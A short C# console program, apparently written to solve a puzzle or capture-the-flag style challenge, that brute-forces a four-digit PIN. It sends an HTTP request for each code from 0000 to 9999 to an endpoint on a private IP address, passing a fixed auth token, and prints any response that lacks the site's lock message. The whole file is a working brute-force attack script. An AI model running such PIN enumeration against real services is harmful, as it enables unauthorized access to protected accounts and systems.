using System;
using System.Net;

namespace Ponies
{
    class Program
    {
        static void Main(string[] args)
        {
            WebClient wc = new WebClient();

            for (int i = 0; i < 10000; i++)
            {
                var str = wc.DownloadString($"http://172.30.151.101:8080/Step9861?authtoken=MRMRMKW35Xohbnqmd&pincode={i.ToString("0000")}");
                Console.WriteLine(i.ToString("0000"));
                if (!str.Contains("The website is protected with a 4 digits code pin and no one in other agencies has been able to write a proper program"))
                {
                    Console.WriteLine(str);
                }
            }
            Console.WriteLine("Hello World!");
        }
    }
}
